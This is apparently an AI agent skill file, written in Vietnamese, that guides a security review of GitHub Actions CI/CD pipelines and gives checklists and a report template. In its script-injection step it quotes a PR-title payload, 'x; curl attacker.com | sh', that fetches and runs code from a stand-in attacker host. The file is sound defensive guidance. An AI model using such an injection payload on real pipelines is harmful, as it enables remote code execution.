---
name: ci-cd-security
description: >
  Kiem tra bao mat CI/CD pipeline, dac biet GitHub Actions. Phan tich workflow files,
  secret handling, permission, supply chain risk va security gate configuration.
  Invoke khi user noi "CI/CD security", "GitHub Actions security", "kiem tra workflow",
  "pipeline security", "secret trong CI".
license: proprietary
metadata:
  author: mobiops
  version: "1.0.0"
  sources:
    - "GitHub Actions Security Hardening: https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions"
    - "OWASP AISVS 1.0 AC.4.2: https://github.com/OWASP/AISVS"
    - "OpenSSF Scorecard — CI Checks: https://securityscorecards.dev/"
    - "SLSA for CI/CD: https://slsa.dev/"
---

# CI/CD Security Skill

Kiem tra bao mat CI/CD pipeline — dac biet GitHub Actions.

---

## Buoc 1 — Xac dinh scope

```
[ ] Tim tat ca file workflow: .github/workflows/*.yml
[ ] Tim Makefile, scripts/deploy.sh hoac equivalent
[ ] Tim .env.example hoac config mau
```

---

## Buoc 2 — Kiem tra GitHub Actions Permissions

**Nguon: GitHub Actions Security Hardening**

**Checklist quyen GITHUB_TOKEN:**

```yaml
# DUNG — minimum permissions
permissions:
  contents: read
  pull-requests: write  # chi khi can comment PR

# SAI — quyen rong hon can thiet
permissions: write-all
```

Checklist:

```
[ ] Moi workflow co khai bao `permissions` explicit?
[ ] Khong dung `permissions: write-all`?
[ ] `contents: write` chi duoc dung khi thuc su can push?
[ ] Secret GITHUB_TOKEN co scope hop ly?
```

---

## Buoc 3 — Kiem tra Third-party Actions

**Rui ro supply chain: action bi tamper sau khi duoc pin boi tag**

```yaml
# SAI — pin bang tag (co the bi move)
- uses: actions/checkout@v4

# DUNG — pin bang commit SHA (immutable)
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

Checklist:

```
[ ] Moi third-party action co duoc pin bang commit SHA?
[ ] SHA duoc comment ro phien ban tuong ung?
[ ] Actions den tu trusted organizations (actions/, github/, google-github-actions/)?
[ ] Co action nao den tu maintainer khong ro lich su?
```

---

## Buoc 4 — Kiem tra Secret Handling

```yaml
# DUNG — dung secrets context
env:
  API_KEY: ${{ secrets.API_KEY }}

# SAI — hardcode trong workflow
env:
  API_KEY: "my-real-key"

# SAI — print secret ra log
- run: echo "Key is ${{ secrets.API_KEY }}"
```

Checklist:

```
[ ] Secret duoc lay tu `secrets.*` context?
[ ] KHONG co hardcode credential trong workflow file?
[ ] KHONG co step nao print secret ra log (du vo tinh qua echo)?
[ ] Secret duoc dung trong step cu the, khong set lam global env tru khi can?
```

---

## Buoc 5 — Kiem tra Script Injection

**Rui ro: user-controlled content inject vao shell script**

```yaml
# NGUY HIEM — PR title co the chua ma doc hai
- name: Greet
  run: echo "Thanks for PR: ${{ github.event.pull_request.title }}"
  # -> ke tan cong tao PR voi title: "x; curl attacker.com | sh"
```

Checklist:

```
[ ] Workflow co dung github.event.* data truc tiep trong run?
[ ] Neu co: data duoc sanitize hoac duoc truyen qua env variable?
```

**Cach an toan:**

```yaml
# DUNG — truyen qua env, shell tu escape
- name: Greet
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Thanks for PR: $PR_TITLE"
```

---

## Buoc 6 — Kiem tra Security Gate Configuration

```
[ ] Co step SAST (Semgrep, CodeQL)?
[ ] Co step Secret Scan (Gitleaks, trufflehog)?
[ ] Co step Dependency Scan (OSV-Scanner, npm audit)?
[ ] Security failures co block merge (exit-code 1)?
[ ] CRITICAL/HIGH findings co block hay chi warn?
```

---

## Buoc 7 — Kiem tra Workflow Triggers

```
[ ] `pull_request_target` co duoc dung khong? (rui ro cao hon `pull_request`)
    Neu co: phai hieu ro khac biet va ap security control tuong ung.
[ ] `workflow_dispatch` co gioi han ai duoc trigger?
[ ] Schedule trigger co dung cho task nhay cam?
```

---

## Output Report

```markdown
# CI/CD Security Review

**Scope:** .github/workflows/
**Date:** [ngay]

## Permissions

| Workflow | permissions declared? | Minimum? |
|---------|----------------------|---------|

## Third-party Actions

| Action | Pinned to SHA? | Trusted? |
|--------|---------------|---------|

## Secret Handling

| Finding | Status |
|---------|--------|

## Security Gate

| Check | Configured? | Blocks merge? |
|-------|------------|--------------|

## Findings

[Chi tiet]

## Recommendations

[Hanh dong uu tien]
```
